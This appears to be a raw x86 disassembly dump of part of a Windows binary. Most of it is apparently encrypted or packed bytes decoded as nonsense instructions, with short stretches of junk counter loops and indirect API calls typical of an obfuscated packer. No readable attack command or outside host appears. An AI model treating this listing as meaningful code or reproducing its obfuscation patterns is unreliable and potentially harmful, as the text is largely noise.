  4069dc:	call   0xcf48f2a2
  4069e1:	sub    al,0x4e
  4069e3:	pop    ebx
  4069e4:	cld    
  4069e5:	popa   
  4069e6:	jb     0x4069bd
  4069e8:	xchg   edx,eax
  4069e9:	or     al,0xb0
  4069eb:	cmp    al,0x39
  4069ed:	jbe    0x40698a
  4069ef:	or     esp,esi
  4069f1:	mov    cl,0x47
  4069f3:	or     BYTE PTR [edi],ch
  4069f5:	jns    0x406990
  4069f7:	sar    BYTE PTR [esi+eiz*2],1
  4069fa:	push   ebp
  4069fb:	cld    
  4069fc:	pushf  
  4069fd:	jl     0x4069e9
  4069ff:	leave  
  406a00:	xor    edi,edi
  406a02:	(bad)  
  406a03:	aam    0xd8
  406a05:	jbe    0x4069cb
  406a07:	es mov esi,0x9ed535b7
  406a0d:	call   0x351fd94d
  406a12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a13:	sbb    ecx,edi
  406a15:	mov    ds:0xac3f4820,eax
  406a1a:	call   0xd352:0xa1ad09f
  406a21:	out    0x1e,eax
  406a23:	dec    edi
  406a24:	mov    al,ds:0x63608cd
  406a29:	mov    edi,0xa7b01bae
  406a2e:	inc    edi
  406a2f:	jle    0x406a98
  406a31:	dec    esp
  406a32:	test   eax,0xb826a897
  406a37:	mov    ecx,0x5ef5017a
  406a3c:	js     0x406aac
  406a3e:	dec    ebx
  406a3f:	sub    esi,ecx
  406a41:	ret    
  406a42:	mov    ch,0x42
  406a44:	or     ebp,0x1
  406a47:	mov    cl,0x1a
  406a49:	mov    cl,ch
  406a4b:	push   ecx
  406a4c:	fbstp  TBYTE PTR [ebx-0x6f]
  406a4f:	repz sbb BYTE PTR [esi],0x5a
  406a53:	lock jp 0x406ad3
  406a56:	push   esp
  406a57:	jl     0x406a6d
  406a59:	repz inc edx
  406a5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a5c:	push   esp
  406a5d:	xor    ebx,edx
  406a5f:	add    edx,DWORD PTR [eax+0x57f215c4]
  406a65:	jg     0x406a62
  406a67:	and    DWORD PTR [esi+0x40739276],esi
  406a6d:	ret    0x1d96
  406a70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a71:	data16 or BYTE PTR [eax+ebx*8],ch
  406a75:	mov    eax,DWORD PTR [eax+0x78]
  406a78:	mov    DWORD PTR [ebp+0xc],eax
  406a7b:	mov    eax,DWORD PTR [ebp-0x4]
  406a7e:	mov    esi,DWORD PTR [ebp-0x8]
  406a81:	xor    eax,edx
  406a83:	xor    esi,edx
  406a85:	add    eax,ecx
  406a87:	add    esi,ecx
  406a89:	imul   eax,esi
  406a8c:	jmp    0x406c05
  406a91:	xorps  xmm5,XMMWORD PTR [edi]
  406a94:	lds    esp,FWORD PTR [edi+0x5d]
  406a97:	in     eax,0x6d
  406a99:	bound  esi,QWORD PTR [esi]
  406a9b:	rcr    DWORD PTR [ebx+0x69],0xe0
  406a9f:	test   edx,ebp
  406aa1:	add    ebp,DWORD PTR ds:0x7fd87c7c
  406aa7:	jl     0x406b25
  406aa9:	inc    ebp
  406aaa:	pop    ss
  406aab:	scas   al,BYTE PTR es:[edi]
  406aac:	loopne 0x406a5d
  406aae:	(bad)  
  406aaf:	neg    DWORD PTR [edi]
  406ab1:	pushf  
  406ab2:	cli    
  406ab3:	mov    ch,0xcc
  406ab5:	test   al,0x80
  406ab7:	add    eax,0xa8218009
  406abc:	inc    edi
  406abd:	stos   BYTE PTR es:[edi],al
  406abe:	xchg   si,ax
  406ac0:	pop    edx
  406ac1:	or     DWORD PTR [edi-0x78],ebx
  406ac4:	xchg   DWORD PTR [eax],esi
  406ac6:	lock inc esi
  406ac8:	jbe    0x406aa2
  406aca:	mov    edi,0x3d2633d4
  406acf:	in     eax,dx
  406ad0:	sbb    DWORD PTR [ebp-0x702561e0],0x98d3b7f7
  406ada:	fsubr  DWORD PTR gs:[edx]
  406add:	cmp    DWORD PTR [ecx],ebx
  406adf:	out    0xd3,eax
  406ae1:	jns    0x406b5f
  406ae3:	loope  0x406b5f
  406ae5:	jge    0x406b10
  406ae7:	xchg   edi,eax
  406ae8:	push   ebx
  406ae9:	cdq    
  406aea:	push   es
  406aeb:	inc    esp
  406aec:	push   cs
  406aed:	push   eax
  406aee:	mov    DWORD PTR [ecx+0x64837f2f],ebp
  406af4:	pop    ebp
  406af5:	push   ebx
  406af6:	and    BYTE PTR [esp+ebx*4-0x6f],bh
  406afa:	stc    
  406afb:	mov    dl,0x9
  406afd:	inc    esi
  406afe:	outs   dx,DWORD PTR ds:[esi]
  406aff:	(bad)  
  406b00:	sub    ch,bh
  406b02:	aam    0x7
  406b04:	fistp  WORD PTR [eax+0x61]
  406b07:	in     eax,dx
  406b08:	iret   
  406b09:	loope  0x406ac3
  406b0b:	dec    esp
  406b0c:	adc    ebp,DWORD PTR [ecx+esi*4+0x23]
  406b10:	inc    ecx
  406b11:	and    bh,cl
  406b13:	in     eax,dx
  406b14:	fnstcw WORD PTR [ecx]
  406b16:	test   bh,dl
  406b18:	push   edi
  406b19:	xchg   DWORD PTR [edi],ebx
  406b1b:	sbb    BYTE PTR [ebx+0x3f],ch
  406b1e:	cmp    al,0x6
  406b20:	das    
  406b21:	mov    edx,0x593277d7
  406b26:	add    eax,0x9877791
  406b2b:	dec    edx
  406b2c:	or     eax,0x47b49e52
  406b31:	inc    edx
  406b32:	das    
  406b33:	out    dx,eax
  406b34:	cs pop esp
  406b36:	dec    esi
  406b37:	cmc    
  406b38:	repnz test eax,0x299eeb5f
  406b3e:	test   eax,0x8591c95c
  406b43:	and    al,0x67
  406b45:	out    dx,al
  406b46:	jo     0x406b43
  406b48:	cmp    DWORD PTR [ecx],eax
  406b4a:	add    eax,0x9d0926c6
  406b4f:	sbb    bh,al
  406b51:	lea    esp,[ebp-0x76ae3efa]
  406b57:	sub    DWORD PTR [ebx],0xa3f083e1
  406b5d:	repz or eax,ebp
  406b60:	stos   DWORD PTR es:[edi],eax
  406b61:	mov    esp,cs
  406b63:	std    
  406b64:	mov    eax,ds:0x2cee696f
  406b69:	xor    eax,0xb4606afd
  406b6e:	fcomp  QWORD PTR [esp+eax*4-0x2b0b0074]
  406b75:	nop
  406b76:	out    dx,al
  406b77:	fld    st(1)
  406b79:	dec    ebp
  406b7a:	jae    0x406b24
  406b7c:	mov    al,0x95
  406b7e:	aas    
  406b7f:	ficom  DWORD PTR [edx-0x22b8d54d]
  406b85:	adc    eax,ebp
  406b87:	jno    0x406bde
  406b89:	add    BYTE PTR [ecx+ebp*2],0x19
  406b8d:	pop    ss
  406b8e:	sbb    esi,esi
  406b90:	pop    ebx
  406b91:	in     al,dx
  406b92:	test   eax,0x7b02a46a
  406b97:	ins    BYTE PTR es:[edi],dx
  406b98:	neg    DWORD PTR [edx+0x350ff401]
  406b9e:	retf   
  406b9f:	jns    0x406be2
  406ba1:	aas    
  406ba2:	imul   edi,ecx,0xffffffbd
  406ba5:	jg     0x406b7b
  406ba7:	mov    esi,0xf5aa652c
  406bac:	xchg   ebp,eax
  406bad:	mov    ecx,esi
  406baf:	cmp    eax,0x4ea434d8
  406bb4:	(bad)  
  406bb6:	repnz pop esi
  406bb8:	rcl    DWORD PTR [edx],0x71
  406bbb:	xchg   ecx,eax
  406bbc:	clc    
  406bbd:	add    al,0x17
  406bbf:	sbb    ecx,edx
  406bc1:	inc    edi
  406bc2:	sub    ch,dl
  406bc4:	xor    DWORD PTR [edx],edx
  406bc6:	mov    WORD PTR [edx+esi*8-0x4d],?
  406bca:	dec    ebp
  406bcb:	and    ah,bl
  406bcd:	mov    eax,0xd749b6b7
  406bd2:	in     al,0x77
  406bd4:	arpl   cx,bx
  406bd6:	fstp   QWORD PTR [ebx+0x7c]
  406bd9:	mov    ds:0x407702b0,eax
  406bde:	cli    
  406bdf:	mov    cl,0x8a
  406be1:	in     al,0xf1
  406be3:	or     dh,dl
  406be5:	bswap  edi
  406be7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406be8:	xchg   edx,eax
  406be9:	ss jne 0x406c0f
  406bec:	dec    ecx
  406bed:	fnstsw WORD PTR [eax-0x1bd7f3b2]
  406bf3:	inc    edx
  406bf4:	mov    edx,DWORD PTR [eax+0x74]
  406bf7:	fnsave [ecx]
  406bf9:	les    ebp,FWORD PTR [ebp-0x4beafe64]
  406bff:	fs dec ax
  406c02:	jecxz  0x406b94
  406c04:	fimul  DWORD PTR [ebx-0xfc4f38b]
  406c0a:	mov    eax,DWORD PTR [ebp-0x4]
  406c0d:	je     0x40675d
  406c13:	xor    eax,edx
  406c15:	add    eax,ecx
  406c17:	mov    ecx,DWORD PTR [ebp+0xc]
  406c1a:	jmp    0x406d93
  406c1f:	stos   BYTE PTR es:[edi],al
  406c20:	adc    DWORD PTR [esp+ebp*2],ebp
  406c23:	mov    ebx,0xc2fd6a61
  406c28:	mov    al,ds:0xc447d58d
  406c2d:	out    0x11,al
  406c2f:	out    dx,eax
  406c30:	sub    al,0x7c
  406c32:	jl     0x406c0c
  406c34:	jg     0x406cb2
  406c36:	jl     0x406c0e
  406c38:	mov    WORD PTR [ecx],gs
  406c3a:	jb     0x406c9b
  406c3c:	or     edi,DWORD PTR [ebx+edx*2]
  406c3f:	pop    ebx
  406c40:	or     eax,0xac5e848f
  406c45:	cmp    ebp,0xffffffd6
  406c48:	cli    
  406c49:	loope  0x406c7a
  406c4b:	aaa    
  406c4c:	jo     0x406c58
  406c4e:	in     al,0xa6
  406c50:	xlat   BYTE PTR ds:[ebx]
  406c51:	mov    ecx,0xf5503265
  406c56:	fmul   QWORD PTR [edi-0x45]
  406c59:	test   al,0xbc
  406c5b:	adc    BYTE PTR ds:0xa6c6a35b,bh
  406c61:	pop    esp
  406c62:	dec    esp
  406c63:	push   cs
  406c64:	jmp    0x406c8a
  406c66:	xchg   ecx,eax
  406c67:	loopne 0x406c57
  406c69:	and    BYTE PTR ds:0xd2c72e7e,dh
  406c6f:	in     eax,0x93
  406c71:	daa    
  406c72:	das    
  406c73:	pop    ss
  406c74:	sbb    dl,dh
  406c76:	int3   
  406c77:	stc    
  406c78:	loop   0x406c97
  406c7a:	mov    eax,ds:0x31089e07
  406c7f:	fwait
  406c80:	and    DWORD PTR [ecx-0x67],ecx
  406c83:	adc    edx,DWORD PTR [edi+eiz*2-0x89cfed0]
  406c8a:	into   
  406c8b:	(bad)  
  406c8c:	sbb    bl,BYTE PTR [edx-0x2e]
  406c8f:	adc    DWORD PTR [edx+0x36],0xffffffb7
  406c93:	sbb    edi,edi
  406c95:	call   0xeb366b9c
  406c9a:	aam    0x78
  406c9c:	jb     0x406c8c
  406c9e:	sbb    bh,BYTE PTR [edi-0x13]
  406ca1:	(bad)  
  406ca2:	out    dx,al
  406ca3:	cmc    
  406ca4:	not    BYTE PTR [edx-0x19]
  406ca7:	out    dx,eax
  406ca8:	lahf   
  406ca9:	outs   dx,DWORD PTR ds:[esi]
  406caa:	call   0x263b:0x727d8ff9
  406cb1:	retf   0x904c
  406cb4:	jge    0x406c37
  406cb6:	sub    DWORD PTR [ebx],eax
  406cb8:	mov    ebp,es
  406cba:	(bad)  
  406cbc:	jg     0x406ca3
  406cbe:	jmp    0x56b4b809
  406cc3:	pop    edi
  406cc4:	xchg   ebp,eax
  406cc5:	sub    eax,0x6481c41d
  406cca:	inc    edi
  406ccb:	mov    edx,0x101857a5
  406cd0:	shl    DWORD PTR [edx+0x70],cl
  406cd3:	xchg   ebp,eax
  406cd4:	repnz stos DWORD PTR es:[edi],eax
  406cd6:	nop
  406cd7:	int3   
  406cd8:	mov    WORD PTR [edi-0x17],ds
  406cdb:	inc    esp
  406cdc:	stos   DWORD PTR es:[edi],eax
  406cdd:	push   edx
  406cde:	cmp    DWORD PTR [ebx],ebp
  406ce0:	sub    dl,BYTE PTR [edx+eiz*8]
  406ce3:	int3   
  406ce4:	xchg   edi,eax
  406ce5:	rcl    BYTE PTR [eax+0x12],1
  406ce8:	popa   
  406ce9:	aas    
  406cea:	inc    ecx
  406ceb:	mov    eax,gs
  406ced:	jmp    0x406c71
  406cef:	dec    ebp
  406cf0:	xchg   ah,dh
  406cf2:	cmp    bl,BYTE PTR [ebp-0x53]
  406cf5:	jne    0x406d54
  406cf7:	push   ebx
  406cf8:	iret   
  406cf9:	fiadd  DWORD PTR [edi-0x26]
  406cfc:	(bad)  
  406cfd:	mov    eax,0x3cd3b8dd
  406d02:	imul   ecx,ebp,0xffffffb0
  406d05:	dec    esp
  406d06:	scas   eax,DWORD PTR es:[edi]
  406d07:	and    al,0x50
  406d09:	jae    0x406cf7
  406d0b:	push   ds
  406d0c:	sbb    al,al
  406d0e:	hlt    
  406d0f:	dec    ebp
  406d10:	out    dx,eax
  406d11:	sub    DWORD PTR ds:0x15203485,ecx
  406d17:	inc    esp
  406d18:	ret    
  406d19:	push   0x7f54e46b
  406d1e:	cs dec eax
  406d20:	push   cs
  406d21:	push   edx
  406d22:	pop    ecx
  406d23:	(bad)  
  406d24:	dec    eax
  406d25:	test   DWORD PTR [edi-0x217edc72],ebp
  406d2b:	iret   
  406d2c:	ret    0xe0f1
  406d2f:	jne    0x406cb5
  406d31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d32:	gs fsubr st(7),st
  406d35:	rcr    BYTE PTR [edi-0x1f],0x48
  406d39:	xchg   dh,ah
  406d3b:	fcmovnbe st,st(2)
  406d3d:	pushf  
  406d3e:	(bad)  [eax-0x6f]
  406d41:	(bad)  
  406d42:	and    eax,0xea397823
  406d47:	adc    al,0x46
  406d49:	dec    edx
  406d4a:	pop    edi
  406d4b:	in     al,0x9b
  406d4d:	sahf   
  406d4e:	rcl    bl,cl
  406d50:	mov    esi,0xbdff59e
  406d55:	pop    es
  406d56:	sahf   
  406d57:	lods   al,BYTE PTR ds:[esi]
  406d58:	pop    ds
  406d59:	stos   BYTE PTR es:[edi],al
  406d5a:	dec    ebx
  406d5b:	xor    al,0xca
  406d5d:	jecxz  0x406d75
  406d5f:	(bad)  
  406d60:	xor    al,0x29
  406d62:	into   
  406d63:	retf   
  406d64:	push   edi
  406d65:	push   eax
  406d66:	fldcw  WORD PTR [ecx]
  406d68:	inc    ebp
  406d69:	or     BYTE PTR [ebx+ebp*1-0x1a66a0ff],dl
  406d70:	xchg   edx,eax
  406d71:	add    eax,0xb3b443bd
  406d76:	adc    DWORD PTR [esi+edx*4+0x7f],ecx
  406d7a:	dec    edx
  406d7b:	mov    DWORD PTR [edx],edi
  406d7d:	div    DWORD PTR gs:[ecx-0x7f]
  406d81:	and    bh,BYTE PTR [edi+0x4cb5cd1c]
  406d87:	sbb    dh,0x5
  406d8a:	jae    0x406d9a
  406d8c:	(bad)  
  406d8d:	cmp    bl,dl
  406d8f:	adc    eax,0xf3194c2
  406d94:	scas   eax,DWORD PTR es:[edi]
  406d95:	shr    ecx,0x74
  406d98:	add    DWORD PTR [eax],eax
  406d9a:	add    BYTE PTR [edx],dl
  406d9c:	sub    BYTE PTR [ebx+0x126d4d55],dh
  406da2:	imul   edi,DWORD PTR [esi+ebx*4-0xcf41656],0xffffffcb
  406daa:	sbb    ecx,DWORD PTR [ebx+0x2f]
  406dad:	jl     0x406e2b
  406daf:	fdivr  DWORD PTR [edi+0x7c]
  406db2:	jl     0x406dc5
  406db4:	sub    DWORD PTR [ecx+0x1174406d],edx
  406dba:	cmp    DWORD PTR [ecx+0x7359134b],0xbeecc0d9
  406dc4:	mov    fs,WORD PTR ds:0xe0d5e920
  406dca:	jno    0x406da5
  406dcc:	retf   0x9389
  406dcf:	sbb    ebx,DWORD PTR [esi+0x79c3525a]
  406dd5:	mov    eax,0xe7f353fa
  406dda:	pop    ecx
  406ddb:	push   cs
  406ddc:	or     DWORD PTR [edi],ebx
  406dde:	sub    ebx,DWORD PTR [ebp+0x22]
  406de1:	cs dec esp
  406de3:	pop    es
  406de4:	mov    dl,0xf
  406de6:	adc    eax,0x391a90e3
  406deb:	adc    DWORD PTR [eax+eiz*1],esi
  406dee:	fdiv   st,st(2)
  406df0:	push   eax
  406df1:	sub    DWORD PTR [ecx+0x7546cde2],edx
  406df7:	or     DWORD PTR [eax],edx
  406df9:	mov    cl,0xdc
  406dfb:	mov    al,ds:0x4ae65b35
  406e00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e01:	test   DWORD PTR [edx+0x6],ecx
  406e04:	icebp  
  406e05:	pop    ecx
  406e06:	test   eax,0x2c6dff7f
  406e0b:	sbb    eax,0x7df41d69
  406e10:	xor    eax,0xe6a14656
  406e15:	aam    0xc6
  406e17:	cmp    BYTE PTR [ecx+0x2f],dl
  406e1a:	dec    esi
  406e1b:	cmp    edx,DWORD PTR [edi]
  406e1d:	in     eax,0x94
  406e1f:	(bad)  
  406e20:	pop    esp
  406e21:	sbb    al,0x4b
  406e23:	push   esp
  406e24:	sahf   
  406e25:	loopne 0x406e62
  406e27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e28:	cmp    eax,0xe2cdc4a7
  406e2d:	xor    al,0x27
  406e2f:	dec    ecx
  406e30:	jns    0x406e69
  406e32:	sub    dh,BYTE PTR [edi-0x46]
  406e35:	je     0x406e07
  406e37:	inc    ebp
  406e38:	sbb    DWORD PTR [edx],eax
  406e3a:	fwait
  406e3b:	std    
  406e3c:	push   0x47
  406e3e:	sbb    cl,cl
  406e40:	push   esi
  406e41:	inc    esp
  406e42:	fist   DWORD PTR [ebx-0x7f]
  406e45:	(bad)  
  406e46:	sbb    DWORD PTR [esi+0x77af244e],ebx
  406e4c:	sub    BYTE PTR [ecx],cl
  406e4e:	mov    ss,WORD PTR [edi+eiz*1-0x2eec5f]
  406e55:	addr16 inc edi
  406e57:	pushf  
  406e58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e59:	fmul   QWORD PTR [edi]
  406e5b:	data16 mov dl,0xc0
  406e5e:	and    eax,DWORD PTR [ebx-0x5c]
  406e61:	(bad)  
  406e63:	inc    esi
  406e64:	cdq    
  406e65:	pushf  
  406e66:	and    al,0x83
  406e68:	pop    ebx
  406e69:	ja     0x406dec
  406e6b:	xor    eax,0x3e9e08cd
  406e70:	pop    es
  406e71:	ins    DWORD PTR es:[edi],dx
  406e72:	push   0x65247466
  406e77:	dec    ebx
  406e78:	mov    ds:0x58efad18,al
  406e7d:	stos   DWORD PTR es:[edi],eax
  406e7e:	or     eax,ecx
  406e80:	dec    ecx
  406e81:	pop    edx
  406e82:	popa   
  406e83:	fstp   QWORD PTR [ebp-0x8]
  406e86:	outs   dx,DWORD PTR ds:[esi]
  406e87:	adc    dh,0x55
  406e8a:	jnp    0x406e79
  406e8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e8d:	mov    edi,0xf8a83dcc
  406e92:	mov    al,0x18
  406e94:	pop    ebx
  406e95:	test   bh,cl
  406e97:	add    eax,0x7432946d
  406e9c:	in     eax,dx
  406e9d:	xor    al,0x10
  406e9f:	xchg   ebp,eax
  406ea0:	ret    0x847e
  406ea3:	ja     0x406e6e
  406ea5:	test   BYTE PTR [ecx+0x49],dl
  406ea8:	ficomp DWORD PTR [edi+edi*4+0x15]
  406eac:	enter  0xd0e,0x2c
  406eb0:	inc    ebp
  406eb1:	xor    DWORD PTR [eax+0x4cbdb434],ecx
  406eb7:	or     eax,0x3978931b
  406ebc:	cdq    
  406ebd:	sbb    al,0x24
  406ebf:	mov    esp,0xce86c96d
  406ec4:	(bad)  
  406ec5:	das    
  406ec6:	mov    eax,0x645666a3
  406ecb:	sub    BYTE PTR [edi],0xec
  406ece:	push   ss
  406ecf:	aam    0x29
  406ed1:	ret    0xc02
  406ed4:	repnz sbb al,0x60
  406ed7:	outs   dx,BYTE PTR ds:[esi]
  406ed8:	popf   
  406ed9:	xchg   ebx,eax
  406eda:	mov    al,0x56
  406edc:	adc    eax,0x4587aa3c
  406ee1:	hlt    
  406ee2:	leave  
  406ee3:	inc    ecx
  406ee4:	clc    
  406ee5:	pop    ecx
  406ee6:	bnd jp 0x406f04
  406ee9:	std    
  406eea:	ins    BYTE PTR es:[edi],dx
  406eeb:	stc    
  406eec:	push   0xffffffb6
  406eee:	mov    esp,0xd8ac17f
  406ef3:	sbb    DWORD PTR [edx+0x32e55187],ebp
  406ef9:	xchg   BYTE PTR ds:[edx-0x26bfccb4],ch
  406f00:	sahf   
  406f01:	sar    DWORD PTR ds:0xcd6c2155,1
  406f07:	cmp    esp,edi
  406f09:	pop    ebp
  406f0a:	xor    esp,DWORD PTR [edx]
  406f0c:	inc    ebp
  406f0d:	sub    eax,0x8450352
  406f12:	mov    DWORD PTR [ebp+0xc],eax
  406f15:	mov    eax,DWORD PTR [ebp+0xc]
  406f18:	pop    esi
  406f19:	leave  
  406f1a:	ret    0x8
  406f1d:	push   ebp
  406f1e:	mov    ebp,esp
  406f20:	sub    esp,0x30
  406f23:	xor    eax,0x5695
  406f28:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  406f2f:	mov    DWORD PTR ds:0x4292ad,0x11
  406f39:	cmp    DWORD PTR ds:0x4292ad,0x0
  406f40:	je     0x406f7d
  406f46:	cmp    DWORD PTR ds:0x4292ad,0x1b
  406f4d:	jne    0x406f61
  406f53:	push   0x7d57
  406f58:	push   DWORD PTR [ebp-0xc]
  406f5b:	call   DWORD PTR ds:0x427ac7
  406f61:	mov    ecx,DWORD PTR ds:0x4292ad
  406f67:	dec    ecx
  406f68:	mov    DWORD PTR ds:0x4292ad,ecx
  406f6e:	jmp    0x406f39
  406f73:	xor    DWORD PTR ds:0x427594,0x427d17
  406f7d:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  406f84:	mov    ecx,DWORD PTR [ebp-0x4]
  406f87:	push   ebx
  406f88:	mov    eax,0x7510857
  406f8d:	adc    ebx,DWORD PTR ds:0x4292c5
  406f93:	xor    ecx,eax
  406f95:	and    DWORD PTR ds:0x4292c5,0x0
  406f9f:	jmp    0x406fb1
  406fa4:	mov    ebx,DWORD PTR ds:0x4292c5
  406faa:	inc    ebx
  406fab:	mov    DWORD PTR ds:0x4292c5,ebx
  406fb1:	cmp    DWORD PTR ds:0x4292c5,0x12
  406fb8:	jae    0x407003
  406fbe:	cmp    DWORD PTR ds:0x4292c5,0x4
  406fc5:	jne    0x406fe4
  406fcb:	push   DWORD PTR [ebp-0x18]
  406fce:	push   DWORD PTR [ebp-0x18]
  406fd1:	push   0x4bf1
  406fd6:	push   DWORD PTR [ebp-0x28]
  406fd9:	push   0x78bb
  406fde:	call   DWORD PTR ds:0x427acb
  406fe4:	cmp    DWORD PTR ds:0x4292c5,0x3
  406feb:	jne    0x406ffe
  406ff1:	mov    ebx,DWORD PTR ds:0x4292c5
  406ff7:	inc    ebx
  406ff8:	mov    DWORD PTR ds:0x4292c5,ebx
  406ffe:	jmp    0x406fa4
  407003:	mov    ebx,0x32729e
  407008:	add    DWORD PTR ds:0x427cfb,0x42c892
  407012:	add    ecx,ebx
  407014:	mov    DWORD PTR [ebp-0x1c],ecx
  407017:	neg    DWORD PTR ds:0x427d0f
  40701d:	mov    ecx,DWORD PTR [ebp+0x14]
  407020:	sub    DWORD PTR ds:0x427cf7,0x56dd
  40702a:	push   esi
  40702b:	push   edi
  40702c:	add    DWORD PTR ds:0x427d0f,0x42c89a
  407036:	test   ecx,ecx
  407038:	mov    DWORD PTR ds:0x4292c5,0x64aa
  407042:	je     0x407316
  407048:	and    DWORD PTR ds:0x42c882,0x0
  407052:	mov    esi,DWORD PTR ds:0x42c882
  407058:	inc    esi
  407059:	mov    DWORD PTR ds:0x42c882,esi
  40705f:	cmp    DWORD PTR ds:0x42c882,0x6
  407066:	jne    0x40707e
  40706c:	push   DWORD PTR [ebp-0x24]
  40706f:	push   DWORD PTR [ebp-0x18]
  407072:	push   DWORD PTR [ebp-0x14]
  407075:	push   DWORD PTR [ebp-0x28]
  407078:	call   DWORD PTR ds:0x427c6f
  40707e:	cmp    DWORD PTR ds:0x42c882,0x5
  407085:	jne    0x40709a
  40708b:	xor    esi,esi
  40708d:	or     esi,DWORD PTR ds:0x42c882
  407093:	inc    esi
  407094:	mov    DWORD PTR ds:0x42c882,esi
  40709a:	cmp    DWORD PTR ds:0x42c882,0x14
  4070a1:	jb     0x407052
  4070a7:	mov    ecx,DWORD PTR [ebp+0x14]
  4070aa:	mov    DWORD PTR ds:0x4292b1,0x1a
  4070b4:	cmp    DWORD PTR ds:0x4292b1,0x0
  4070bb:	je     0x407188
  4070c1:	cmp    DWORD PTR ds:0x4292b1,0xc
  4070c8:	jne    0x4070de
  4070ce:	push   0x42783c
  4070d3:	push   0x4275b4
  4070d8:	call   DWORD PTR ds:0x4279f3
  4070de:	cmp    DWORD PTR ds:0x4292b1,0xd
  4070e5:	jne    0x4070fa
  4070eb:	xor    edi,edi
  4070ed:	xor    edi,DWORD PTR ds:0x4292b1
  4070f3:	dec    edi
  4070f4:	mov    DWORD PTR ds:0x4292b1,edi
  4070fa:	xor    edi,edi
  4070fc:	or     edi,DWORD PTR ds:0x4292b1
  407102:	dec    edi
  407103:	mov    DWORD PTR ds:0x4292b1,edi
  407109:	jmp    0x4070b4
  40710e:	and    DWORD PTR ds:0x4292b5,0x0
  407118:	jmp    0x40712a
  40711d:	mov    edi,DWORD PTR ds:0x4292b5
  407123:	inc    edi
  407124:	mov    DWORD PTR ds:0x4292b5,edi
  40712a:	cmp    DWORD PTR ds:0x4292b5,0x16
  407131:	jae    0x407188
  407137:	cmp    DWORD PTR ds:0x4292b5,0x4
  40713e:	jne    0x407169
  407144:	push   DWORD PTR [ebp-0x28]
  407147:	push   0x1a81
  40714c:	push   0x427d07
  407151:	push   0x8e69
  407156:	push   0x489c
  40715b:	push   0x5b7d
  407160:	push   DWORD PTR [ebp-0x10]
  407163:	call   DWORD PTR ds:0x427c73
  407169:	cmp    DWORD PTR ds:0x4292b5,0x3
  407170:	jne    0x407183
  407176:	mov    edi,DWORD PTR ds:0x4292b5
  40717c:	inc    edi
  40717d:	mov    DWORD PTR ds:0x4292b5,edi
  407183:	jmp    0x40711d
  407188:	mov    ecx,DWORD PTR [ecx]
  40718a:	jmp    0x407313
  40718f:	jne    0x40718d
  407191:	mov    cl,0x3f
  407193:	mov    ch,0x31
  407195:	cmc    
  407196:	mov    dl,0xc1
  407198:	pop    edx
  407199:	sub    DWORD PTR [esi+0x151675d4],esp
  40719f:	pop    ss
  4071a0:	and    DWORD PTR [esp+edi*2-0x18],edi
  4071a4:	jg     0x407222
  4071a6:	jl     0x4071ca
  4071a8:	ds popa 
  4071aa:	push   esi
  4071ab:	je     0x4071d0
  4071ad:	or     DWORD PTR [eax],ecx
  4071af:	cli    
  4071b0:	push   ebx
  4071b1:	imul   esi,DWORD PTR [ebp-0x3170f04],0x1d
  4071b8:	das    
  4071b9:	pop    ebx
  4071ba:	xchg   ebp,eax
  4071bb:	fild   DWORD PTR [edx+edi*4]
  4071be:	xor    eax,0x2b259dc0
  4071c3:	mov    al,ds:0x13d17886
  4071c8:	push   edi
  4071c9:	fcomp  QWORD PTR [ecx+0x50]
  4071cc:	inc    ecx
  4071cd:	lea    esi,[edi+0x2b]
  4071d0:	adc    dh,BYTE PTR [ecx-0x5a]
  4071d3:	and    dl,dh
  4071d5:	test   DWORD PTR [edx-0x2b032b3f],0x590b4cdb
  4071df:	inc    esp
  4071e0:	enter  0x8880,0x36
  4071e4:	fs and al,0x24
  4071e7:	pop    esi
  4071e8:	jmp    0x546da608
  4071ed:	imul   esp,DWORD PTR [edi-0x23],0x45
  4071f1:	inc    esp
  4071f2:	add    eax,0x25c51e30
  4071f7:	sahf   
  4071f8:	add    bh,BYTE PTR [eax]
  4071fa:	add    ah,BYTE PTR [edx]
  4071fc:	ror    BYTE PTR [edx+0x45],1
  4071ff:	push   edx
  407200:	adc    BYTE PTR [edi-0x2ee709e6],dh
  407206:	adc    DWORD PTR gs:[ebp+0x17],0xe40f5bf6
  40720e:	xor    DWORD PTR [edi-0x56],ebx
  407211:	pop    esi
  407212:	scas   eax,DWORD PTR es:[edi]
  407213:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407214:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407215:	out    0x21,al
  407217:	push   esi
  407218:	mov    gs,ebx
  40721a:	ret    
  40721b:	cmp    BYTE PTR [bx+0x45],0xf4
  407220:	push   ss
  407221:	leave  
  407222:	rol    dl,1
  407224:	aam    0x8e
  407226:	inc    eax
  407227:	arpl   WORD PTR [ebx],di
  407229:	je     0x407210
  40722b:	into   
  40722c:	mov    edi,DWORD PTR [ebx]
  40722e:	mov    eax,ds:0x6b189bbe
  407233:	rcl    DWORD PTR [eax+0x6],0xca
  407237:	mov    cl,0xad
  407239:	fcom   DWORD PTR [eax+0x76ba3047]
  40723f:	push   es
  407240:	mov    al,BYTE PTR [edx-0x3f]
  407243:	shl    edx,0xee
  407246:	or     edx,DWORD PTR [ebx]
  407248:	(bad)  
  407249:	fsubr  DWORD PTR [ebx]
  40724b:	cmc    
  40724c:	daa    
  40724d:	or     eax,0x782ed099
  407252:	mov    esp,ebp
  407254:	or     al,0xe2
  407256:	les    ecx,FWORD PTR [esi]
  407258:	jo     0x4071f1
  40725a:	cwde   
  40725b:	fsubr  st(2),st
  40725d:	sahf   
  40725e:	shr    ah,0x72
  407261:	jno    0x407285
  407263:	retf   0xd1c0
  407266:	call   0x4590:0xc7492eb9
  40726d:	hlt    
  40726e:	adc    ebp,DWORD PTR [esi]
  407270:	push   0xe0b105d2
  407275:	adc    DWORD PTR [ebp-0x3a1869fa],edi
  40727b:	jmp    0x4072e4
  40727d:	ins    BYTE PTR es:[edi],dx
  40727e:	rcl    BYTE PTR [ebx],1
